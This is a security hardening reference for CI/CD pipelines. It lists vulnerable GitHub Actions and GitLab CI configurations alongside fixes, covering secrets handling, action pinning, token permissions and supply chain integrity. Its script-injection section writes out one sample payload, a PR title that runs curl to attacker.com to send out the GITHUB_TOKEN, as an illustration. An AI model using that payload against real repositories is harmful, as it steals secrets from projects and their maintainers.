# CI/CD Pipeline Security Hardening

This reference covers security checks for CI/CD pipeline configurations across GitHub Actions, GitLab CI, Jenkins, and general pipeline security practices.

---

## GitHub Actions

### 1. pull_request_target with Checkout of PR Code

**What to check:** Workflows triggered by `pull_request_target` that check out the pull request's code.

**Detection pattern:**
```yaml
on:
  pull_request_target:

jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS
```

**Why it matters:** `pull_request_target` runs in the context of the base branch and has access to repository secrets. If it checks out and executes PR code (from a fork), the PR author can steal all repository secrets. This is a well-known code injection vector that has compromised major open-source projects.

**Severity:** Critical

**How to fix:**
```yaml
# Option 1: Use pull_request (not pull_request_target) — no access to secrets
on:
  pull_request:

# Option 2: If you need secrets, don't checkout PR code
on:
  pull_request_target:
jobs:
  label:
    steps:
      # Do NOT checkout PR code here
      - uses: actions/labeler@v4
```

---

### 2. Unpinned Actions (Using @main Instead of @sha)

**What to check:** Actions referenced by branch name or mutable tag instead of full commit SHA.

**Detection pattern:**
```yaml
# Bad — mutable references
- uses: actions/checkout@main
- uses: actions/checkout@v4
- uses: some-org/some-action@latest

# Good — pinned to commit SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```

**Why it matters:** If an action's repository is compromised, the attacker can push malicious code to the tag or branch. All workflows using `@v4` would immediately execute the compromised code. Pinning to a commit SHA ensures the action cannot change without updating the workflow. This is a supply chain attack vector.

**Severity:** Medium

**How to fix:**
```yaml
# Pin to full commit SHA with a version comment
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
- uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8  # v4.0.2
```

Use `pin-github-action` tool or Dependabot to manage SHA pinning.

---

### 3. Excessive GITHUB_TOKEN Permissions

**What to check:** Workflow or job-level permissions that are broader than needed.

**Detection pattern:**
```yaml
# Bad — full read-write access to everything
permissions: write-all

# Bad — no permissions block (inherits repo default, often broad)
# (No permissions key at all)

# Bad — excessive specific permissions
permissions:
  contents: write
  packages: write
  issues: write
  pull-requests: write
  actions: write
```

**Why it matters:** An overly permissive GITHUB_TOKEN allows a compromised step to modify repository contents, create releases, comment on issues (phishing), approve and merge PRs, and trigger other workflows. The principle of least privilege should be applied.

**Severity:** High

**How to fix:**
```yaml
# Set minimal permissions at workflow level
permissions:
  contents: read

jobs:
  build:
    # Override per-job if needed
    permissions:
      contents: read
      packages: write  # Only if publishing packages
```

Also configure the repository default token permissions to read-only: Settings > Actions > General > Workflow permissions > Read repository contents.

---

### 4. Secrets in Workflow Files

**What to check:** Hardcoded secrets, tokens, or credentials in workflow YAML.

**Detection pattern:**
```yaml
# Bad — hardcoded secrets
env:
  API_KEY: YOUR_API_KEY_HERE
  AWS_ACCESS_KEY_ID: YOUR_AWS_KEY_HERE

# Bad — secrets echoed to logs
- run: echo ${{ secrets.MY_SECRET }}

# Bad — secrets in workflow names or comments
# Deploy to prod (password: hunter2)
```

**Why it matters:** Workflow files are version-controlled and visible to anyone with repository access. Secrets in YAML persist in git history even if removed.

**Severity:** Critical

**How to fix:**
```yaml
# Use GitHub Actions secrets
env:
  API_KEY: ${{ secrets.API_KEY }}
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}

# Never echo secrets — use masking
- run: echo "::add-mask::${{ secrets.MY_SECRET }}"
```

---

### 5. Missing Environment Protection Rules

**What to check:** Deployments to production without environment protection.

**Detection pattern:**
```yaml
# Bad — deploys to production without environment protection
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: deploy-to-production.sh

# Good — uses environment with protection rules
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production  # Requires approval, has scoped secrets
```

**Why it matters:** Without environment protection rules, any workflow run (including from PRs) can deploy to production. Environment protection rules add required reviewers, wait timers, and restrict which branches can deploy. They also scope secrets to specific environments.

**Severity:** High

**How to fix:**
```yaml
jobs:
  deploy:
    environment:
      name: production
      url: https://myapp.example.com
    runs-on: ubuntu-latest
```

Configure in Settings > Environments > production:
- Required reviewers
- Wait timer
- Deployment branches (main only)

---

### 6. Self-Hosted Runners Without Isolation

**What to check:** Workflows using self-hosted runners, especially for public repositories.

**Detection pattern:**
```yaml
jobs:
  build:
    runs-on: self-hosted  # Potential risk
    # Or:
    runs-on: [self-hosted, linux, x64]
```

**Why it matters:** Self-hosted runners persist between jobs. A malicious PR can leave backdoors, modified tools, or stolen credentials on the runner. In public repositories, any fork can trigger workflows on self-hosted runners. The runner may have access to the internal network, cloud credentials via instance metadata, and other sensitive resources.

**Severity:** High (Critical for public repos)

**How to fix:**
- Use ephemeral runners (actions-runner-controller with ephemeral mode)
- Never use self-hosted runners for public repository PR workflows
- Use containerized runners with fresh images per job
- Restrict self-hosted runner groups to specific repositories

---

### 7. Script Injection via Untrusted Input

**What to check:** Workflow expressions used directly in `run:` steps.

**Detection pattern:**
```yaml
# Bad — PR title injected into shell
- run: echo "PR title is ${{ github.event.pull_request.title }}"

# Bad — issue body injected
- run: |
    echo "${{ github.event.issue.body }}" > description.txt

# Bad — commit message injected
- run: echo ${{ github.event.head_commit.message }}
```

**Why it matters:** Untrusted inputs (PR titles, issue bodies, branch names, commit messages) are interpolated directly into the shell command before execution. An attacker can craft a PR title like `"; curl attacker.com/steal?token=$GITHUB_TOKEN; echo "` to execute arbitrary commands with access to secrets.

**Severity:** High

**How to fix:**
```yaml
# Use environment variables instead of direct interpolation
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $PR_TITLE"

# Or use an intermediate action for validation
```

---

## GitLab CI

### 8. Protected Variables Not Restricted to Protected Branches

**What to check:** CI/CD variables containing secrets not marked as protected.

**Detection pattern:**
- Variables in Settings > CI/CD > Variables without "Protected" flag
- Sensitive variables available on feature branches and merge requests
- Variables without "Masked" flag that contain secrets

**Why it matters:** Unprotected variables are available to all branches and merge requests. A developer (or attacker with push access) can create a branch with a pipeline that exfiltrates the secrets. Protected variables are only available on protected branches (e.g., main).

**Severity:** High

**How to fix:**
- Mark sensitive variables as "Protected" in GitLab CI/CD settings
- Mark sensitive variables as "Masked" to prevent log exposure
- Use environment-scoped variables for deployment credentials
- Restrict merge request pipelines from accessing sensitive variables

---

### 9. allow_failure on Security Jobs

**What to check:** Security scanning jobs configured with `allow_failure: true`.

**Detection pattern:**
```yaml
sast:
  stage: test
  allow_failure: true  # Security scan failures won't block pipeline

dependency_scanning:
  allow_failure: true  # Vulnerable dependencies won't block merge
```

**Why it matters:** If security jobs are allowed to fail, vulnerabilities and security issues will not block merge requests or deployments. The scans become advisory-only and are easily ignored. Security gates must be blocking to be effective.

**Severity:** Medium

**How to fix:**
```yaml
sast:
  stage: test
  allow_failure: false
  rules:
    - if: $CI_MERGE_REQUEST_IID
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

# Use exit-code based failure thresholds instead:
dependency_scanning:
  allow_failure: false
  variables:
    DS_SEVERITY_THRESHOLD: "HIGH"  # Only fail on high+ severity
```

---

### 10. Missing SAST/DAST Stages

**What to check:** Pipeline without security scanning stages.

**Detection pattern:**
- No `sast`, `dast`, `dependency_scanning`, `container_scanning`, or `secret_detection` jobs
- No `include` of GitLab security scanning templates
- No third-party security scanning integration

**Why it matters:** Without automated security scanning, vulnerabilities in code, dependencies, and containers go undetected until they are exploited. CI/CD is the ideal place to catch issues early.

**Severity:** Medium

**How to fix:**
```yaml
include:
  - template: Security/SAST.gitlab-ci.yml
  - template: Security/Dependency-Scanning.gitlab-ci.yml
  - template: Security/Secret-Detection.gitlab-ci.yml
  - template: Security/Container-Scanning.gitlab-ci.yml

stages:
  - build
  - test
  - security
  - deploy
```

---

### 11. Artifact Exposure

**What to check:** Job artifacts containing sensitive data or accessible too broadly.

**Detection pattern:**
```yaml
artifacts:
  paths:
    - .env              # Sensitive file as artifact
    - config/secrets.yml # Secrets in artifacts
    - "**/*"            # Everything as artifact
  expire_in: never      # Artifacts persist indefinitely
```

**Why it matters:** Artifacts are downloadable by anyone with access to the project (or publicly, for public projects). Sensitive files like `.env`, build logs with secrets, or test reports with credentials can be exfiltrated via artifacts.

**Severity:** High

**How to fix:**
```yaml
artifacts:
  paths:
    - build/            # Only build outputs
    - reports/          # Only test reports
  exclude:
    - "**/.env"
    - "**/*.key"
    - "**/secrets.*"
  expire_in: 1 week    # Set expiration
```

---

## General CI/CD Security

### 12. Artifact Signing and Verification

**What to check:** Whether build artifacts (container images, packages, binaries) are signed and verified.

**Detection pattern:**
- No image signing step (cosign, Notary, DCT)
- No SBOM generation
- No artifact verification before deployment
- Container images pushed without signatures

**Why it matters:** Without signing, an attacker who compromises the registry or pipeline can replace legitimate artifacts with malicious ones. Verification ensures that deployed artifacts were produced by the trusted pipeline.

**Severity:** Medium

**How to fix:**
```yaml
# Sign with cosign (Sigstore)
- name: Sign container image
  run: |
    cosign sign --yes ${{ env.IMAGE }}@${{ steps.build.outputs.digest }}

# Verify before deployment
- name: Verify image signature
  run: |
    cosign verify --certificate-oidc-issuer https://token.actions.githubusercontent.com \
      ${{ env.IMAGE }}@${{ env.DIGEST }}
```

---

### 13. Supply Chain Integrity (SLSA, Sigstore)

**What to check:** Whether the pipeline implements supply chain security standards.

**Detection pattern:**
- No SLSA provenance generation
- No Sigstore integration
- No in-toto attestations
- Dependencies downloaded without integrity verification
- No lock file integrity checks

**Why it matters:** Supply chain attacks target the build process itself. SLSA (Supply-chain Levels for Software Artifacts) provides a framework for ensuring build integrity. Without provenance, there is no way to verify that an artifact was built from a specific source by a trusted builder.

**Severity:** Medium

**How to fix:**
```yaml
# Use SLSA GitHub Actions generator
- uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v1.9.0
  with:
    image: ${{ env.IMAGE }}
    digest: ${{ needs.build.outputs.digest }}
```

---

### 14. Pipeline as Code Review Requirements

**What to check:** Whether changes to pipeline configuration require code review.

**Detection pattern:**
- Pipeline files (`.github/workflows/`, `.gitlab-ci.yml`) not covered by CODEOWNERS
- No branch protection requiring reviews for CI config changes
- Pipeline files modifiable by anyone with write access

**Why it matters:** Pipeline configuration controls what code runs with access to secrets, deployment credentials, and production environments. Unreviewed pipeline changes can introduce secret exfiltration, backdoors in build artifacts, or skip security gates.

**Severity:** High

**How to fix:**
```
# CODEOWNERS
/.github/workflows/ @security-team @devops-team
/.gitlab-ci.yml @security-team @devops-team
/Jenkinsfile @security-team @devops-team
```

Enable branch protection rules requiring approval for changes to these paths.

---

### 15. Deployment Approval Gates

**What to check:** Whether production deployments require explicit approval.

**Detection pattern:**
- Deployment to production triggered automatically on merge to main
- No manual approval step before production deployment
- No separation between staging validation and production release

**Why it matters:** Without approval gates, a compromised pipeline or a merged vulnerability goes directly to production. Approval gates provide a human checkpoint for verifying test results, security scan outputs, and change readiness.

**Severity:** High

**How to fix:**
```yaml
# GitHub Actions
deploy-production:
  environment:
    name: production
  needs: [test, security-scan, deploy-staging]
  # Requires manual approval configured in environment settings

# GitLab CI
deploy_production:
  stage: deploy
  when: manual  # Requires manual trigger
  environment:
    name: production
  only:
    - main
```

---

### 16. Secret Scanning in Pipeline

**What to check:** Whether the pipeline includes secret scanning for code and commit history.

**Detection pattern:**
- No secret scanning job/step in the pipeline
- Secret scanning present but results not blocking the pipeline
- Secret scanning only on main branch (not on PRs/MRs)

**Why it matters:** Developers accidentally commit secrets regularly. Pipeline-based secret scanning catches these before they reach the default branch. Pre-commit hooks help but can be bypassed.

**Severity:** Medium

**How to fix:**
```yaml
# GitHub Actions
- name: Scan for secrets
  uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

# GitLab CI (built-in)
include:
  - template: Security/Secret-Detection.gitlab-ci.yml
```

---

### 17. Build Reproducibility

**What to check:** Whether builds are reproducible and deterministic.

**Detection pattern:**
- Using `npm install` instead of `npm ci`
- No lock file (`package-lock.json`, `Pipfile.lock`, `go.sum`) committed
- Using `latest` tags for build tool images
- `apt-get install` without version pinning
- No build environment version pinning

**Why it matters:** Non-reproducible builds make it impossible to verify that a deployed artifact matches the source code. If the same source produces different artifacts, supply chain attacks become harder to detect. Reproducibility also aids incident response.

**Severity:** Medium

**How to fix:**
```yaml
# Use lock files and ci-specific install commands
- run: npm ci          # Not npm install
- run: pip install -r requirements.txt --require-hashes
- run: go build -trimpath  # Reproducible Go builds
```

---

### 18. Dependency Caching Risks

**What to check:** Caching configuration that could introduce supply chain risks.

**Detection pattern:**
```yaml
# Shared cache across branches (potentially unsafe)
- uses: actions/cache@v3
  with:
    path: ~/.npm
    key: npm-${{ hashFiles('**/package-lock.json') }}

# Cache restored from any branch
- uses: actions/cache@v3
  with:
    path: node_modules
    key: modules-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      modules-  # Falls back to any cache matching this prefix
```

**Why it matters:** A PR from a fork could poison the shared cache. If the cache is restored by a subsequent trusted workflow, the poisoned dependencies execute with access to secrets. Caching `node_modules` directly (vs. `~/.npm`) is particularly risky as it includes executable code.

**Severity:** Medium

**How to fix:**
```yaml
# Cache the package manager cache, not node_modules
- uses: actions/cache@v3
  with:
    path: ~/.npm
    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    # Do not use overly broad restore-keys

# Always run npm ci after cache restore to verify integrity
- run: npm ci
```

---

### 19. Insufficient Logging and Audit Trail

**What to check:** Whether pipeline runs produce sufficient audit logs.

**Detection pattern:**
- No deployment logging or tracking
- Pipeline logs expire quickly
- No integration with centralized logging
- No deployment tracking (who deployed what, when)

**Why it matters:** Without audit trails, security incidents involving the pipeline are harder to investigate. You need to know who triggered a deployment, what code was deployed, what secrets were accessed, and whether any pipeline steps were modified.

**Severity:** Low

**How to fix:**
- Enable audit logging in your CI/CD platform
- Send deployment events to centralized logging (Datadog, Splunk, ELK)
- Tag deployments with commit SHA, deployer identity, and timestamp
- Retain pipeline logs for at least 90 days
